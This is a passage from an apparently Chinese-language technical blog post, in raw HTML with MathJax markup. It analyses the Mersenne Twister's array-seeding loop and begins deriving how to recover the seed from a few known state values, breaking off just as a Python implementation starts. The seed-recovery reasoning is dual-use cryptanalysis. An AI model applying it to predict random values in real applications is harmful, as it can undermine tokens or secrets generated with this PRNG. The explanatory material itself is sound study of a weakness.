(mt[i] ^ ((mt[i<span class="number">-1</span>] ^ (mt[i<span class="number">-1</span>] &gt;&gt; <span class="number">30</span>)) * <span class="number">1664525U</span>))</span><br><span class="line">                 + init_key[j] + (<span class="type">uint32_t</span>)j; <span class="comment">/* non linear */</span></span><br><span class="line">        i++; j++;</span><br><span class="line">        <span class="keyword">if</span> (i&gt;=N) { mt[<span class="number">0</span>] = mt[N<span class="number">-1</span>]; i=<span class="number">1</span>; }    <span class="comment">// the code for (2)(3)</span></span><br><span class="line">        <span class="keyword">if</span> (j&gt;=key_length) j=<span class="number">0</span>;   </span><br><span class="line">    }</span><br></pre></td></tr></table></figure><p>首先，i 和 j 同时自增，当<code>i&gt;=N</code>时，将<code>mt[0]</code>的值修改为<code>mt[623]</code>的值；当<code>j&gt;=key_length</code>时，将<code>j</code>置为0，因为循环的条件是<code>max(N,key_length)</code>，因此<code>if</code>的两个判断均能被执行，当执行完 <code>if (i&gt;=N) { mt[0] = mt[N-1]; i=1; }</code>之后，<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.375ex;" xmlns="http://www.w3.org/2000/svg" width="2.243ex" height="1.92ex" role="img" focusable="false" viewbox="0 -683 991.6 848.6"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D43D" d="M447 625Q447 637 354 637H329Q323 642 323 645T325 664Q329 677 335 683H352Q393 681 498 681Q541 681 568 681T605 682T619 682Q633 682 633 672Q633 670 630 658Q626 642 623 640T604 637Q552 637 545 623Q541 610 483 376Q420 128 419 127Q397 64 333 21T195 -22Q137 -22 97 8T57 88Q57 130 80 152T132 174Q177 174 182 130Q182 98 164 80T123 56Q115 54 115 53T122 44Q148 15 197 15Q235 15 271 47T324 130Q328 142 387 380T447 625Z"/></g><g data-mml-node="mn" transform="translate(588,-150) scale(0.707)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"/></g></g></g></g></svg></mjx-container>状态被改变，<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex;" xmlns="http://www.w3.org/2000/svg" width="0.781ex" height="1.52ex" role="img" focusable="false" viewbox="0 -661 345 672"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"/></g></g></g></svg></mjx-container> 被重置到1，也即下一次更新的状态是<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.339ex;" xmlns="http://www.w3.org/2000/svg" width="2.243ex" height="1.885ex" role="img" focusable="false" viewbox="0 -683 991.6 833"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D43D" d="M447 625Q447 637 354 637H329Q323 642 323 645T325 664Q329 677 335 683H352Q393 681 498 681Q541 681 568 681T605 682T619 682Q633 682 633 672Q633 670 630 658Q626 642 623 640T604 637Q552 637 545 623Q541 610 483 376Q420 128 419 127Q397 64 333 21T195 -22Q137 -22 97 8T57 88Q57 130 80 152T132 174Q177 174 182 130Q182 98 164 80T123 56Q115 54 115 53T122 44Q148 15 197 15Q235 15 271 47T324 130Q328 142 387 380T447 625Z"/></g><g data-mml-node="mn" transform="translate(588,-150) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"/></g></g></g></g></svg></mjx-container>（这里的更新是在<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.339ex;" xmlns="http://www.w3.org/2000/svg" width="2.243ex" height="1.885ex" role="img" focusable="false" viewbox="0 -683 991.6 833"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D43D" d="M447 625Q447 637 354 637H329Q323 642 323 645T325 664Q329 677 335 683H352Q393 681 498 681Q541 681 568 681T605 682T619 682Q633 682 633 672Q633 670 630 658Q626 642 623 640T604 637Q552 637 545 623Q541 610 483 376Q420 128 419 127Q397 64 333 21T195 -22Q137 -22 97 8T57 88Q57 130 80 152T132 174Q177 174 182 130Q182 98 164 80T123 56Q115 54 115 53T122 44Q148 15 197 15Q235 15 271 47T324 130Q328 142 387 380T447 625Z"/></g><g data-mml-node="mn" transform="translate(588,-150) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"/></g></g></g></g></svg></mjx-container>已被更新过的基础上），那么在这一次循环中<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.339ex;" xmlns="http://www.w3.org/2000/svg" width="2.243ex" height="1.885ex" role="img" focusable="false" viewbox="0 -683 991.6 833"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D43D" d="M447 625Q447 637 354 637H329Q323 642 323 645T325 664Q329 677 335 683H352Q393 681 498 681Q541 681 568 681T605 682T619 682Q633 682 633 672Q633 670 630 658Q626 642 623 640T604 637Q552 637 545 623Q541 610 483 376Q420 128 419 127Q397 64 333 21T195 -22Q137 -22 97 8T57 88Q57 130 80 152T132 174Q177 174 182 130Q182 98 164 80T123 56Q115 54 115 53T122 44Q148 15 197 15Q235 15 271 47T324 130Q328 142 387 380T447 625Z"/></g><g data-mml-node="mn" transform="translate(588,-150) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"/></g></g></g></g></svg></mjx-container>被改变了两次，在一般情况下循环到这里就结束了。</p><p>那么这里<code>i</code>和<code>j</code>的作用就很明显了，<code>i</code> 控制状态数组的索引，如果 <code>i &gt;= N</code>，回绕到头部；<code>j</code> 控制 key 的索引，如果 <code>j &gt;= key_length</code>，回绕 key 数组</p><p>这里设<code>B = 1566083941</code>，第二个循环执行了下面的操作：</p><script type="math/tex; mode=display">\begin{array}{lll}I_{i}=(J_i\oplus u(I_{i-1})B)-i\quad\forall i\in[2,623] \qquad \mathrm{(7)} \\I_{0}=I_{623} \qquad \qquad\qquad\qquad\qquad\qquad\qquad \hspace{0.15cm} \left(8\right) \\I_{1}=(I_1\oplus u(I_0)B)-1 \qquad \qquad \qquad \qquad \hspace{0.2cm}\left(9\right) \\I_{0}\text{=0x80000000} \qquad \qquad \qquad \qquad \qquad \hspace{0.45cm}\ \mathrm{(10)}\end{array}</script><p>这里的第(7)个式子从<code>i=2</code>开始，因为<code>i=1</code>在(6)中被使用，剩下的操作基本上从代码中都能看懂</p><h2 id="从少量输出中恢复种子"><a href="#从少量输出中恢复种子" class="headerlink" title="从少量输出中恢复种子"></a>从少量输出中恢复种子</h2><p>假如我们现在知道了初始状态的两个连续值 $J<em>i<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.452ex;" xmlns="http://www.w3.org/2000/svg" width="2.262ex" height="2.149ex" role="img" focusable="false" viewbox="0 -750 1000 950"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">和</text></g></g></g></svg></mjx-container>J</em>{i-1}$可从(4)式写出</p><script type="math/tex; mode=display">K_{j}+j=J_{i} - \left(PI_{i} \oplus u\left(J_{i-1}\right) A\right)& \forall i \in[3,623], j \equiv i-1 & \bmod k \qquad(11)\\</script><p>注：因为<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="5.783ex" height="2.262ex" role="img" focusable="false" viewbox="0 -750 2556 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"/></g><g data-mml-node="mn" transform="translate(389,0)"><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z"/></g><g data-mml-node="mo" transform="translate(889,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"/></g><g data-mml-node="mo" transform="translate(1278,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"/></g><g data-mml-node="mn" transform="translate(1667,0)"><path data-c="36" d="M42 313Q42 476 123 571T303 666Q372 666 402 630T432 550Q432 525 418 510T379 495Q356 495 341 509T326 548Q326 592 373 601Q351 623 311 626Q240 626 194 566Q147 500 147 364L148 360Q153 366 156 373Q197 433 263 433H267Q313 433 348 414Q372 400 396 374T435 317Q456 268 456 210V192Q456 169 451 149Q440 90 387 34T253 -22Q225 -22 199 -14T143 16T92 75T56 172T42 313ZM257 397Q227 397 205 380T171 335T154 278T148 216Q148 133 160 97T198 39Q222 21 251 21Q302 21 329 59Q342 77 347 104T352 209Q352 289 347 316T329 361Q302 397 257 397Z"/></g><g data-mml-node="mo" transform="translate(2167,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"/></g></g></g></svg></mjx-container>的原因 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex;" xmlns="http://www.w3.org/2000/svg" width="0.781ex" height="1.52ex" role="img" focusable="false" viewbox="0 -661 345 672"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"/></g></g></g></svg></mjx-container> 要从3开始，<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="2.839ex" height="1.545ex" role="img" focusable="false" viewbox="0 -683 1255 683"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"/></g><g data-mml-node="mi" transform="translate(751,0)"><path data-c="1D43C" d="M43 1Q26 1 26 10Q26 12 29 24Q34 43 39 45Q42 46 54 46H60Q120 46 136 53Q137 53 138 54Q143 56 149 77T198 273Q210 318 216 344Q286 624 286 626Q284 630 284 631Q274 637 213 637H193Q184 643 189 662Q193 677 195 680T209 683H213Q285 681 359 681Q481 681 487 683H497Q504 676 504 672T501 655T494 639Q491 637 471 637Q440 637 407 634Q393 631 388 623Q381 609 337 432Q326 385 315 341Q245 65 245 59Q245 52 255 50T307 46H339Q345 38 345 37T342 19Q338 6 332 0H316Q279 2 179 2Q143 2 113 2T65 2T43 1Z"/></g></g></g></svg></mjx-container>状态的值固定</p><p>同时假设我们知道种子数组 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="2.011ex" height="1.545ex" role="img" focusable="false" viewbox="0 -683 889 683"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D43E" d="M285 628Q285 635 228 637Q205 637 198 638T191 647Q191 649 193 661Q199 681 203 682Q205 683 214 683H219Q260 681 355 681Q389 681 418 681T463 682T483 682Q500 682 500 674Q500 669 497 660Q496 658 496 654T495 648T493 644T490 641T486 639T479 638T470 637T456 637Q416 636 405 634T387 623L306 305Q307 305 490 449T678 597Q692 611 692 620Q692 635 667 637Q651 637 651 648Q651 650 654 662T659 677Q662 682 676 682Q680 682 711 681T791 680Q814 680 839 681T869 682Q889 682 889 672Q889 650 881 642Q878 637 862 637Q787 632 726 586Q710 576 656 534T556 455L509 418L518 396Q527 374 546 329T581 244Q656 67 661 61Q663 59 666 57Q680 47 717 46H738Q744 38 744 37T741 19Q737 6 731 0H720Q680 3 625 3Q503 3 488 0H478Q472 6 472 9T474 27Q478 40 480 43T491 46H494Q544 46 544 71Q544 75 517 141T485 216L427 354L359 301L291 248L268 155Q245 63 245 58Q245 51 253 49T303 46H334Q340 37 340 35Q340 19 333 5Q328 0 317 0Q314 0 280 1T180 2Q118 2 85 2T49 1Q31 1 31 11Q31 13 34 25Q38 41 42 43T65 46Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Z"/></g></g></g></svg></mjx-container> 的长度 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex;" xmlns="http://www.w3.org/2000/svg" width="1.179ex" height="1.595ex" role="img" focusable="false" viewbox="0 -694 521 705"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D458" d="M121 647Q121 657 125 670T137 683Q138 683 209 688T282 694Q294 694 294 686Q294 679 244 477Q194 279 194 272Q213 282 223 291Q247 309 292 354T362 415Q402 442 438 442Q468 442 485 423T503 369Q503 344 496 327T477 302T456 291T438 288Q418 288 406 299T394 328Q394 353 410 369T442 390L458 393Q446 405 434 405H430Q398 402 367 380T294 316T228 255Q230 254 243 252T267 246T293 238T320 224T342 206T359 180T365 147Q365 130 360 106T354 66Q354 26 381 26Q429 26 459 145Q461 153 479 153H483Q499 153 499 144Q499 139 496 130Q455 -11 378 -11Q333 -11 305 15T277 90Q277 108 280 121T283 145Q283 167 269 183T234 206T200 217T182 220H180Q168 178 159 139T145 81T136 44T129 20T122 7T111 -2Q98 -11 83 -11Q66 -11 57 -1T48 16Q48 26 85 176T158 471L195 616Q196 629 188 632T149 637H144Q134 637 131 637T124 640T121 647Z"/></g></g></g></svg></mjx-container> ，那么我们就能恢复索引值 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.462ex;" xmlns="http://www.w3.org/2000/svg" width="0.932ex" height="1.957ex" role="img" focusable="false" viewbox="0 -661 412 865"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D457" d="M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 376Z"/></g></g></g></svg></mjx-container> （个人感觉能够恢复 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.462ex;" xmlns="http://www.w3.org/2000/svg" width="0.932ex" height="1.957ex" role="img" focusable="false" viewbox="0 -661 412 865"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D457" d="M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 376Z"/></g></g></g></svg></mjx-container> 的原因是，在<code>if (j&gt;=key_length) j=0;</code>这行代码里，<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.462ex;" xmlns="http://www.w3.org/2000/svg" width="0.932ex" height="1.957ex" role="img" focusable="false" viewbox="0 -661 412 865"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D457" d="M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 376Z"/></g></g></g></svg></mjx-container> 和数组的长度存在关联），之后就能恢复 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.666ex;" xmlns="http://www.w3.org/2000/svg" width="2.768ex" height="2.211ex" role="img" focusable="false" viewbox="0 -683 1223.3 977.2"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D43E" d="M285 628Q285 635 228 637Q205 637 198 638T191 647Q191 649 193 661Q199 681 203 682Q205 683 214 683H219Q260 681 355 681Q389 681 418 681T463 682T483 682Q500 682 500 674Q500 669 497 660Q496 658 496 654T495 648T493 644T490 641T486 639T479 638T470 637T456 637Q416 636 405 634T387 623L306 305Q307 305 490 449T678 597Q692 611 692 620Q692 635 667 637Q651 637 651 648Q651 650 654 662T659 677Q662 682 676 682Q680 682 711 681T791 680Q814 680 839 681T869 682Q889 682 889 672Q889 650 881 642Q878 637 862 637Q787 632 726 586Q710 576 656 534T556 455L509 418L518 396Q527 374 546 329T581 244Q656 67 661 61Q663 59 666 57Q680 47 717 46H738Q744 38 744 37T741 19Q737 6 731 0H720Q680 3 625 3Q503 3 488 0H478Q472 6 472 9T474 27Q478 40 480 43T491 46H494Q544 46 544 71Q544 75 517 141T485 216L427 354L359 301L291 248L268 155Q245 63 245 58Q245 51 253 49T303 46H334Q340 37 340 35Q340 19 333 5Q328 0 317 0Q314 0 280 1T180 2Q118 2 85 2T49 1Q31 1 31 11Q31 13 34 25Q38 41 42 43T65 46Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Z"/></g><g data-mml-node="mi" transform="translate(882,-150) scale(0.707)"><path data-c="1D457" d="M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 376Z"/></g></g></g></g></svg></mjx-container> 的实际值。这样的推导是合理的，我们在上面说过 <code>key</code> 数组的 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex;" xmlns="http://www.w3.org/2000/svg" width="1.179ex" height="1.595ex" role="img" focusable="false" viewbox="0 -694 521 705"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D458" d="M121 647Q121 657 125 670T137 683Q138 683 209 688T282 694Q294 694 294 686Q294 679 244 477Q194 279 194 272Q213 282 223 291Q247 309 292 354T362 415Q402 442 438 442Q468 442 485 423T503 369Q503 344 496 327T477 302T456 291T438 288Q418 288 406 299T394 328Q394 353 410 369T442 390L458 393Q446 405 434 405H430Q398 402 367 380T294 316T228 255Q230 254 243 252T267 246T293 238T320 224T342 206T359 180T365 147Q365 130 360 106T354 66Q354 26 381 26Q429 26 459 145Q461 153 479 153H483Q499 153 499 144Q499 139 496 130Q455 -11 378 -11Q333 -11 305 15T277 90Q277 108 280 121T283 145Q283 167 269 183T234 206T200 217T182 220H180Q168 178 159 139T145 81T136 44T129 20T122 7T111 -2Q98 -11 83 -11Q66 -11 57 -1T48 16Q48 26 85 176T158 471L195 616Q196 629 188 632T149 637H144Q134 637 131 637T124 640T121 647Z"/></g></g></g></svg></mjx-container> 取决于种子的类型或其长度，即使我们不知道 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex;" xmlns="http://www.w3.org/2000/svg" width="1.179ex" height="1.595ex" role="img" focusable="false" viewbox="0 -694 521 705"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D458" d="M121 647Q121 657 125 670T137 683Q138 683 209 688T282 694Q294 694 294 686Q294 679 244 477Q194 279 194 272Q213 282 223 291Q247 309 292 354T362 415Q402 442 438 442Q468 442 485 423T503 369Q503 344 496 327T477 302T456 291T438 288Q418 288 406 299T394 328Q394 353 410 369T442 390L458 393Q446 405 434 405H430Q398 402 367 380T294 316T228 255Q230 254 243 252T267 246T293 238T320 224T342 206T359 180T365 147Q365 130 360 106T354 66Q354 26 381 26Q429 26 459 145Q461 153 479 153H483Q499 153 499 144Q499 139 496 130Q455 -11 378 -11Q333 -11 305 15T277 90Q277 108 280 121T283 145Q283 167 269 183T234 206T200 217T182 220H180Q168 178 159 139T145 81T136 44T129 20T122 7T111 -2Q98 -11 83 -11Q66 -11 57 -1T48 16Q48 26 85 176T158 471L195 616Q196 629 188 632T149 637H144Q134 637 131 637T124 640T121 647Z"/></g></g></g></svg></mjx-container> 的实际长度，猜测它对于我们来说也是非常容易的。</p><p>注：通常情况下<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.312ex;" xmlns="http://www.w3.org/2000/svg" width="7.589ex" height="1.882ex" role="img" focusable="false" viewbox="0 -694 3354.6 832"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D458" d="M121 647Q121 657 125 670T137 683Q138 683 209 688T282 694Q294 694 294 686Q294 679 244 477Q194 279 194 272Q213 282 223 291Q247 309 292 354T362 415Q402 442 438 442Q468 442 485 423T503 369Q503 344 496 327T477 302T456 291T438 288Q418 288 406 299T394 328Q394 353 410 369T442 390L458 393Q446 405 434 405H430Q398 402 367 380T294 316T228 255Q230 254 243 252T267 246T293 238T320 224T342 206T359 180T365 147Q365 130 360 106T354 66Q354 26 381 26Q429 26 459 145Q461 153 479 153H483Q499 153 499 144Q499 139 496 130Q455 -11 378 -11Q333 -11 305 15T277 90Q277 108 280 121T283 145Q283 167 269 183T234 206T200 217T182 220H180Q168 178 159 139T145 81T136 44T129 20T122 7T111 -2Q98 -11 83 -11Q66 -11 57 -1T48 16Q48 26 85 176T158 471L195 616Q196 629 188 632T149 637H144Q134 637 131 637T124 640T121 647Z"/></g><g data-mml-node="mo" transform="translate(798.8,0)"><path data-c="2264" d="M674 636Q682 636 688 630T694 615T687 601Q686 600 417 472L151 346L399 228Q687 92 691 87Q694 81 694 76Q694 58 676 56H670L382 192Q92 329 90 331Q83 336 83 348Q84 359 96 365Q104 369 382 500T665 634Q669 636 674 636ZM84 -118Q84 -108 99 -98H678Q694 -104 694 -118Q694 -130 679 -138H98Q84 -131 84 -118Z"/></g><g data-mml-node="mn" transform="translate(1854.6,0)"><path data-c="36" d="M42 313Q42 476 123 571T303 666Q372 666 402 630T432 550Q432 525 418 510T379 495Q356 495 341 509T326 548Q326 592 373 601Q351 623 311 626Q240 626 194 566Q147 500 147 364L148 360Q153 366 156 373Q197 433 263 433H267Q313 433 348 414Q372 400 396 374T435 317Q456 268 456 210V192Q456 169 451 149Q440 90 387 34T253 -22Q225 -22 199 -14T143 16T92 75T56 172T42 313ZM257 397Q227 397 205 380T171 335T154 278T148 216Q148 133 160 97T198 39Q222 21 251 21Q302 21 329 59Q342 77 347 104T352 209Q352 289 347 316T329 361Q302 397 257 397Z"/><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" transform="translate(500,0)"/><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z" transform="translate(1000,0)"/></g></g></g></svg></mjx-container></p><p>实现上面操作的代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td 